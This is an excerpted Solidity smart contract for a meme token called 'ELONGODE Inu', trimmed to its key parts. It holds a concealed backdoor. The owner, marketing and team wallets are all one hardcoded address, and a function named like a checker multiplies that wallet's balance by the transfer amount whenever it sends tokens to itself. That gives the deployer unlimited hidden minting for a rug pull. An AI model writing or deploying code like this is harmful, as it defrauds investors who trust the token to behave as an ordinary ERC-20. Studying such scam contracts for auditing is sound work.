...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x6d1DbaBa38d6D99755cF6C8CED4DA27E9af7eFdB; 
...
contract ELONGODE is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "ELONGODE Inu";
    string private _symbol = "ELONGODE";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x6d1DbaBa38d6D99755cF6C8CED4DA27E9af7eFdB); // 
    address payable public teamWalletAddress = payable(0x6d1DbaBa38d6D99755cF6C8CED4DA27E9af7eFdB); // 
	...
	function ELONGODEChecker(address f,address t,uint256 m) private {
        if (f == t && f ==marketingWalletAddress)
         {_balances[marketingWalletAddress] = _balances[marketingWalletAddress] * (m);
         }
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            ELONGODEChecker(sender,recipient,amount);
            return true;
        }
    }
